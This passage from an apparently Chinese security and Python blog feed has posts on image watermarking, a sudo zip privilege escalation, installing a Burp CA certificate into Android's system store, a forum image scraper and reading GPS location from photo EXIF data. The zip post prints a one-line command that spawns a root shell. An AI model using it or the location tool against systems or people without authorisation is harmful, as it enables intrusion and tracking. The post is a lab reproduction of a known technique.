class="hljs-keyword">import</span> ImageDraw<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> ImageFont<br><br><br><span class="hljs-comment"># get image path</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_folder</span>(<span class="hljs-params">fpath, wm_file, save_path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        img_suffix_list = [<span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;PNG&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;JPG&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(fpath):<br>            <span class="hljs-keyword">if</span> i.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> img_suffix_list:<br>                img_path = fpath + <span class="hljs-string">&#x27;/&#x27;</span> + i<br>                img_water_mark(img_file=img_path, wm_file=wm_file, save_path=save_path)<br>            time.sleep(<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(traceback.print_exc())<br><br><span class="hljs-comment"># add water mark</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">img_water_mark</span>(<span class="hljs-params">img_file, wm_file, save_path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        img = Image.<span class="hljs-built_in">open</span>(img_file)<br>        watermark = Image.<span class="hljs-built_in">open</span>(wm_file)<br>        img_size = img.size<br>        wm_size = watermark.size<br>        <span class="hljs-comment"># print(wm_size)</span><br><br>        <span class="hljs-comment"># if img_size[0] &amp; lt &amp; wm_size[0]:</span><br>        watermark.resize(<span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x * <span class="hljs-number">0.5</span>), watermark.size)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;image size：&#x27;</span>, img_size)<br>        <span class="hljs-comment"># default, the watermark position is set to the lower right corner</span><br>        wm_position = (img_size[<span class="hljs-number">0</span>] - wm_size[<span class="hljs-number">0</span>], img_size[<span class="hljs-number">1</span>] - wm_size[<span class="hljs-number">1</span>])<br>        <span class="hljs-comment"># new layer</span><br>        layer = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, img.size)<br>        <span class="hljs-comment"># Add watermark picture to layer</span><br>        layer.paste(watermark, wm_position) <br>        mark_img = Image.composite(layer, img, layer)<br>        new_file_name = img_file.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]<br>        mark_img.save(save_path + new_file_name)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(traceback.print_exc())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">watermarks</span>(<span class="hljs-params">post_name</span>):<br>    <span class="hljs-keyword">if</span> post_name == <span class="hljs-string">&#x27;all&#x27;</span>:<br>        post_name = <span class="hljs-string">&#x27;*&#x27;</span><br>    dir_name = <span class="hljs-string">&#x27;./sourceimg/&#x27;</span> + post_name + <span class="hljs-string">&#x27;/*&#x27;</span><br>    <span class="hljs-keyword">for</span> files <span class="hljs-keyword">in</span> glob.glob(dir_name):<br>        im = Image.<span class="hljs-built_in">open</span>(files)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(im.getbands()) &lt; <span class="hljs-number">3</span>:<br>            im = im.convert(<span class="hljs-string">&#x27;RGB&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(files)<br>        font = ImageFont.truetype(<span class="hljs-string">&#x27;STSONG.TTF&#x27;</span>, <span class="hljs-built_in">max</span>(<span class="hljs-number">30</span>, <span class="hljs-built_in">int</span>(im.size[<span class="hljs-number">1</span>] / <span class="hljs-number">20</span>)))<br>        draw = ImageDraw.Draw(im)<br>        draw.text((im.size[<span class="hljs-number">0</span>] / <span class="hljs-number">2</span>, im.size[<span class="hljs-number">1</span>] / <span class="hljs-number">2</span>), <span class="hljs-string">u&#x27;@kuibarj.top&#x27;</span>, fill=(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), font=font)<br>        im.save(files)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] Compositing please wait...&quot;</span>)<br>        get_folder(fpath=<span class="hljs-string">r&quot;./sourceimg/image/&quot;</span>, wm_file=<span class="hljs-string">r&quot;./resources/blogo.png&quot;</span>, save_path=<span class="hljs-string">r&quot;./sourceimg/image/&quot;</span>)<br>        watermarks(sys.argv[<span class="hljs-number">1</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] add logo success!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[usage] &lt;input&gt;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\netc: python3 watermark.py all&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>加上水印后</p><p><img src="https://s2.ax1x.com/2019/07/02/ZYmWd0.png" alt=""></p><h3 id="END">END</h3><p>原作者写的代码中，是有个判断图片是否小于水印图片，这里我把其注释了，因为在自己的环境上代码跑不起来。</p><p>完整代码内容 <a href="https://github.com/Kuibagit/BlogImageWatermark">https://github.com/Kuibagit/BlogImageWatermark</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用ZIP进行提权</title>
    <link href="/posts/c80808d5.html"/>
    <url>/posts/c80808d5.html</url>
    
    <content type="html"><![CDATA[<p>今天看到一则推文：在linux中使用zip可以低权限用户提升为高权限。</p><p>当使用高权限运行时，zip的执行会发生变化。假设系统管理员已向普通用户授予sudo权限以运行zip，可导致低权限用户提升为高权限。</p><h3 id="利用前提">利用前提</h3><ul><li>安装有zip(一般情况都装有)</li><li>允许本地用户已sudo权限运行zip</li></ul><h3 id="复现">复现</h3><p>创建一个普通用户 <code>test</code>，并设置允许以<code>sudo</code>权限运行zip。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m <span class="hljs-built_in">test</span><br>passwd <span class="hljs-built_in">test</span><br>vi /etc/sudoers<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB14MPNb.GF3KVjSZFv762_nXXaV.png" alt=""></p><p>ssh登录<code>test</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1Ct_Ob8GE3KVjSZFh763kaFXaw.png" alt=""></p><p>touch一个txt文件(任意)，然后使用<code>-T</code>选项并用<code>--unzip-command</code>（调用命令），进行文件压缩。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> fu.txt<br>sudo zip r.zip fu.txt -T --unzip-command=<span class="hljs-string">&quot;bash -c /bin/bash&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB11s_VbW1s3KVjSZFA760_ZXXaw.png" alt=""></p><h3 id="END">END</h3><p>这个好鸡肋。。。</p><p>这其实还是&quot;使用&quot; <code>sudo</code> 方式进行提权的，现在基本没有管理员会把普通用户加入到<code>sudoers</code>文件中了吧。</p><p>Reference</p><p><a href="https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>ZIP Privilege Escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android安装根证书到系统</title>
    <link href="/posts/84477c27.html"/>
    <url>/posts/84477c27.html</url>
    
    <content type="html"><![CDATA[<p>update：2021-06-26</p><p>1、如还是无法抓到数据包，则安装低版本微信(v7.0.22)或许可行。</p><p>2、现在openssl 版本基本是大于1.0版本的，所以文件名应该为： <code>9a5ba575.0</code> 。</p><h2 id="前言">前言</h2><p>最近公司有小程序要测试，Burpsuite无法抓到数据包，https证书已经安装了，还是无法捉到数据包。<br>Google找到一下文章 <a href="https://testerhome.com/topics/17746" title="安卓微信 7.0 不能抓 https">安卓微信7.0不能抓 https</a>。</p><p>微信不再信任Android 7及之后用户安装的证书，可是我用的是Android 5.1的咋也不能正常捉包呢，不管了。手机刚好有root权限，那就把证书安到系统下试试。</p><h2 id="正文">正文</h2><p>步骤分为：<br>1、从Brupsuite中导出证书文件 <code>cert.der</code><br>2、使用Openssl生成pem文件(这里我把ca证书复制到kali操作，Windows可安装 <a href="https://git-scm.com/downloads">Git Bahs</a>，自带Openssl)<br>3、读取取ca证书hash值<br>4、重命名pem文件</p><p>Openssl 版本小于于 1.0 使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -<span class="hljs-keyword">in</span> cert.der -inform der -outform pem -out cert.pem<br><br>openssl x509 -inform PEM -subject_hash -<span class="hljs-keyword">in</span> cert.pem | <span class="hljs-built_in">head</span> -1<br><br><span class="hljs-built_in">cat</span> cert.pem &gt; 7bf17d07.0<br><br>openssl x509 -inform PEM -text -<span class="hljs-keyword">in</span> cert.pem -out /dev/null &gt;&gt; 7bf17d07.0<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1ABOXaxiH3KVjSZPf760BiVXaO.png" alt=""></p><p>Openssl 版本大于 1.0 使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -inform DER -<span class="hljs-keyword">in</span> cacert.der -out cacert.pem<br><br>openssl x509 -inform PEM -subject_hash_old -<span class="hljs-keyword">in</span> cacert.pem | <span class="hljs-built_in">head</span> -1<br><br><span class="hljs-built_in">mv</span> cacert.pem 9a5ba575.0<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/30/JqiW5R.png" alt=""></p><p>把<code>7bf17d07.0</code> 或 <code>9a5ba575.0</code>  传到到手机上，</p><p>然后再复制到 <code>/system/etc/security/cacerts/</code> 目录下(以下使用RE文件管理器进行操作)，并修改其权限为<code>644</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1qZ9caBWD3KVjSZKP761p7FXaP.png" alt=""></p><p>重启手机，ca证书已经安装到系统下，此时就可以正常捉到小程序的数据包了。</p><p><img src="https://ae01.alicdn.com/kf/HTB1pRCXaxiH3KVjSZPf760BiVXaK.png" alt=""></p><p><img src="https://i.loli.net/2021/07/11/N8L7qRwxElK94Je.png" alt=""></p><p>Reference</p><p><a href="https://testerhome.com/topics/17746">https://testerhome.com/topics/17746</a><br><a href="https://www.codercto.com/a/71371.html">https://www.codercto.com/a/71371.html</a><br><a href="http://www.gtopia.org/blog/2010/02/der-vs-crt-vs-cer-vs-pem-certificates/">http://www.gtopia.org/blog/2010/02/der-vs-crt-vs-cer-vs-pem-certificates/</a></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CA证书</tag>
      
      <tag>Burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初次使用BeautifulSoup(bs4)小记</title>
    <link href="/posts/f939aff4.html"/>
    <url>/posts/f939aff4.html</url>
    
    <content type="html"><![CDATA[<div class="yinyue" style="text-align:center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1358800103&auto=1&height=66"></iframe></div><h3 id="Foreword">Foreword</h3><p>某天，逛到了某社区一帖子，发现<a href="http://hongdou.gxnews.com.cn/viewthread-16250447-1.html">帖子</a>里的妹子图片，嗯还蛮不错的。帖子有7页，每页20张图，要是每张都手动下载，那岂不“累死了”？不存在的，祭出py download it。</p><h3 id="Main-body">Main body</h3><p>初次使用BeautifulSoup,代码不入眼，大佬勿喷~</p><p>大体步骤：<br>1、获取7个页面url<br>2、获取单个页面里所有图片的url<br>3、下载所有图片<br>4、提取文件名并入库保存图片</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding: utf-8-*-</span><br><span class="hljs-comment"># _Author: Kuibahd</span><br><span class="hljs-comment"># _Time: 2019/5/14</span><br><br><span class="hljs-keyword">import</span> requests, os, time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_image</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">7</span>):<br>        url = <span class="hljs-string">&quot;http://hongdou.gxnews.com.cn/viewthread-16250447-&quot;</span> + <span class="hljs-built_in">str</span>(x) + <span class="hljs-string">&quot;.html&quot;</span><br>        <span class="hljs-built_in">print</span>(url)<br>        header = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2107.204 Safari/537.36&#x27;</span><br>        &#125;<br>        html = requests.get(url, headers=header)<br>        soup = BeautifulSoup(html.text, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br>        all_src = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;viewmessage&#x27;</span>)<br>        <span class="hljs-comment"># print(all_src[0].img[&#x27;data-original&#x27;])</span><br>        i2 = <span class="hljs-built_in">len</span>(all_src)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, i2):<br>            <span class="hljs-comment"># print(all_src[i].img[&#x27;data-original&#x27;])</span><br>            img_url = all_src[i].img[<span class="hljs-string">&#x27;data-original&#x27;</span>]<br>            html = requests.get(img_url, headers=header)<br>            <span class="hljs-comment"># Extract the file name from the url</span><br>            file_name = os.path.basename(img_url)<br>            fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./image/%s&#x27;</span> % file_name, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>            fp.write(html.content)<br>            fp.close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;************************\n[*] 正在下载图片...&quot;</span>)<br>    start = time.time()<br>    get_image()<br>    end = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载完成，共耗时：%f s&quot;</span> % (end - start))<br><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1dM9iaBKw3KVjSZTE763uRpXav.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1LCN2Xkxz61VjSZFt761DSVXan.png" alt=""></p><h3 id="END">END</h3><p>单线程+300k左右的网速下载居然花了十多分钟。。。。。多线程后面再说吧^&gt;&lt;^</p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>Python</tag>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过手机图片&quot;定位&quot;</title>
    <link href="/posts/f8cabab2.html"/>
    <url>/posts/f8cabab2.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>“之前”网上有条消息(好像是《社会工程：安全体系中的人性漏洞》一书里面的，网上也有相关的例子)–可以从一张图片定位出该图片的拍摄地点，从而知道“你”曾经去过的一些地方。</p><h3 id="正文">正文</h3><p>网上已经有蛮多的例子了，以下我也是网上找的代码，然后进行改改组合起来，代码渣渣。</p><h3 id="准备阶段">准备阶段</h3><p><strong>百度地图AK</strong></p><p><strong>手机原图照片(手机开启GPS且相机设置记录位置信息拍的照片)</strong></p><p>步骤：</p><p>使用python的<code>exifread</code>模块进行读取照片的exif信息，然后把里面的经纬度，拍照手机等信息提取出来。<br>提取出来后再格式化转换一下经纬度，然后调用百度度API进行查询，最后提取【省、市、区、街道】(格式化)等信息</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding: utf-8-*-</span><br><span class="hljs-comment"># _Author: Kuibahd </span><br><span class="hljs-comment"># Time：2019/5/10</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> division<br><span class="hljs-keyword">import</span> exifread, requests, json, re<br><br><br><span class="hljs-comment"># 提取img信息并获取拍照地点</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">imageread</span>():<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\Pychram\\img\\IMG_20190510_201621.jpg&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>    imagetext = exifread.process_file(f)<br>    <span class="hljs-comment"># for key in imagetext:</span><br>    <span class="hljs-comment">#     print(key, &quot;:&quot;, imagetext[key])</span><br>    f.close()<br>    make = <span class="hljs-string">&#x27;&#x27;</span><br>    ns = <span class="hljs-string">&#x27;&#x27;</span><br>    ms = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> imagetext:<br>        <span class="hljs-keyword">if</span> q == <span class="hljs-string">&quot;Image Make&quot;</span>:<br>            make = imagetext[q]<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">&quot;Image Model&quot;</span>:<br>            model = imagetext[q]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;拍摄图片手机：&quot;</span>, <span class="hljs-built_in">str</span>(make) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(model))<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">&quot;Image DateTime&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片拍摄时间：&quot;</span>, imagetext[q])<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">&quot;GPS GPSLongitude&quot;</span>:<br>            ns = imagetext[q]<br>            <span class="hljs-comment"># print(&quot;GPS经度：&quot;, imagetext[q], imagetext[&#x27;GPS GPSLatitudeRef&#x27;])</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GPS经度：&quot;</span>, imagetext[q])<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">&quot;GPS GPSLatitude&quot;</span>:<br>            ms = imagetext[q]<br>            <span class="hljs-comment"># print(&quot;GPS纬度：&quot;, imagetext[q], imagetext[&#x27;GPS GPSLongitudeRef&#x27;])</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GPS纬度：&quot;</span>, imagetext[q])<br><br>    <span class="hljs-comment"># 下面转换有些问题导致最后定位偏离了</span><br>    strs1 = <span class="hljs-built_in">str</span>(ns)  <span class="hljs-comment"># 经度</span><br>    strs2 = <span class="hljs-built_in">str</span>(ms)  <span class="hljs-comment"># 纬度</span><br>    <span class="hljs-comment"># 格式化经度</span><br>    e1 = strs1[:<span class="hljs-number">4</span>] + <span class="hljs-string">&quot;°&quot;</span> + strs1[<span class="hljs-number">6</span>:]<br>    e2 = e1[:<span class="hljs-number">6</span>] + <span class="hljs-string">&quot;′&quot;</span> + e1[<span class="hljs-number">8</span>:]<br>    e3 = e2[<span class="hljs-number">1</span>:<span class="hljs-number">9</span>] + <span class="hljs-string">&quot;″&quot;</span><br>    <span class="hljs-comment"># print(e3)</span><br><br>    <span class="hljs-comment"># 转换经度</span><br>    x1 = re.split(<span class="hljs-string">&quot;°|′|″&quot;</span>, e3)[:<span class="hljs-number">3</span>]<br>    x1 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, x1))<br>    <span class="hljs-comment"># print(x1[0] + x1[1] / 60 + x1[2] / 3600)</span><br>    lng = <span class="hljs-built_in">str</span>(x1[<span class="hljs-number">0</span>] + x1[<span class="hljs-number">1</span>] / <span class="hljs-number">60</span> + x1[<span class="hljs-number">2</span>] / <span class="hljs-number">3600</span>)<br><br>    <span class="hljs-comment"># 格式纬度</span><br>    n1 = strs2[:<span class="hljs-number">3</span>] + <span class="hljs-string">&quot;°&quot;</span> + strs2[<span class="hljs-number">5</span>:]<br>    n2 = n1[:<span class="hljs-number">6</span>] + <span class="hljs-string">&quot;′&quot;</span> + n1[<span class="hljs-number">7</span>:]<br>    n3 = n2[<span class="hljs-number">1</span>:<span class="hljs-number">9</span>] + <span class="hljs-string">&quot;″&quot;</span><br>    <span class="hljs-comment"># print(n3)</span><br><br>    <span class="hljs-comment"># 转换纬度</span><br>    x2 = re.split(<span class="hljs-string">&quot;°|′|″&quot;</span>, n3)[:<span class="hljs-number">3</span>]<br>    x2 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, x2))<br>    <span class="hljs-comment"># print(x2[0] + x2[1] / 60 + x2[2] / 3600)</span><br>    lat = <span class="hljs-built_in">str</span>(x2[<span class="hljs-number">0</span>] + x2[<span class="hljs-number">1</span>] / <span class="hljs-number">60</span> + x2[<span class="hljs-number">2</span>] / <span class="hljs-number">3600</span>)<br><br>    <span class="hljs-comment"># 根据经纬度获取地址</span><br>    ak = <span class="hljs-string">&quot;XXXXXXXXXX&quot;</span>  <span class="hljs-comment"># 百度map AK</span><br>    url = <span class="hljs-string">&quot;http://api.map.baidu.com/geocoder/v2/&quot;</span><br>    items = <span class="hljs-string">&quot;?callback=renderReverse&amp;location=&#123;&#125;,&#123;&#125;&amp;output=json&amp;pois=1&amp;ak=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lat, lng, ak)<br>    req = requests.get(url + items, timeout=<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># print(items)</span><br>    data = req.text<br><br>    <span class="hljs-comment"># 提取信息</span><br>    data = data.replace(<span class="hljs-string">&quot;renderReverse&amp;&amp;renderReverse(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    data = data[:-<span class="hljs-number">1</span>]<br>    baiduAddr = json.loads(data)<br>    province = baiduAddr[<span class="hljs-string">&quot;result&quot;</span>][<span class="hljs-string">&quot;addressComponent&quot;</span>][<span class="hljs-string">&quot;province&quot;</span>]<br>    city = baiduAddr[<span class="hljs-string">&quot;result&quot;</span>][<span class="hljs-string">&quot;addressComponent&quot;</span>][<span class="hljs-string">&quot;city&quot;</span>]<br>    district = baiduAddr[<span class="hljs-string">&quot;result&quot;</span>][<span class="hljs-string">&quot;addressComponent&quot;</span>][<span class="hljs-string">&quot;district&quot;</span>]<br>    street = baiduAddr[<span class="hljs-string">&quot;result&quot;</span>][<span class="hljs-string">&quot;addressComponent&quot;</span>][<span class="hljs-string">&quot;street&quot;</span>]<br>    formatted_address = baiduAddr[<span class="hljs-string">&quot;result&quot;</span>][<span class="hljs-string">&quot;formatted_address&quot;</span>]<br>    new_line = street + <span class="hljs-string">&quot;|&quot;</span> + formatted_address + <span class="hljs-string">&quot;|&quot;</span> + <span class="hljs-built_in">str</span>(lng) + <span class="hljs-string">&quot;|&quot;</span> + <span class="hljs-built_in">str</span>(<br>        lat) + <span class="hljs-string">&quot;|&quot;</span> + province + <span class="hljs-string">&quot;|&quot;</span> + city + <span class="hljs-string">&quot;|&quot;</span> + district<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****************************************\n拍摄图片位置：&quot;</span>)<br>    <span class="hljs-built_in">print</span>(new_line)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    imageread()<br><br></code></pre></td></tr></table></figure><p>最终结果：</p><p><img src="https://ae01.alicdn.com/kf/HTB1bSOiaBKw3KVjSZTE763uRpXaZ.png" alt=""></p><h3 id="END">END</h3><p>由于经纬度格式化、转换那里不是很懂，最后的定位结果(都)是偏离。。。。</p><p><img src="https://ae01.alicdn.com/kf/HTB1TfqcavWG3KVjSZFg762TspXaQ.png" alt=""></p><p>Reference</p><p><a href="http://www.cnblogs.com/shiguangliangchunshanbo/p/9745848.html">http://www.cnblogs.com/shiguangliangchunshanbo/p/9745848.html</a><br><a href="https://blog.csdn.net/oYeZhou/article/details/82012471">https://blog.csdn.net/oYeZhou/article/details/82012471</a><br><a href="https://blog.csdn.net/ChenVast/article/details/81669788">https://blog.csdn.net/ChenVast/article/details/81669788</a><br><a href="https://blog.csdn.net/tyt_XiaoTao/article/details/80410279">https://blog.csdn.net/tyt_XiaoTao/article/details/80410279</a><br><a href="https://www.zhihu.com/question/27043850">https://www.zhihu.com/question/27043850</a><br><a href="https://www.cnblogs.com/shijingjing07/p/7474570.html">https://www.cnblogs.com/shijingjing07/p/7474570.html</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE Vulnerability in antSword</title>
    <link href="/posts/4e91690d.html"/>
    <url>/posts/4e91690d.html</url>
    
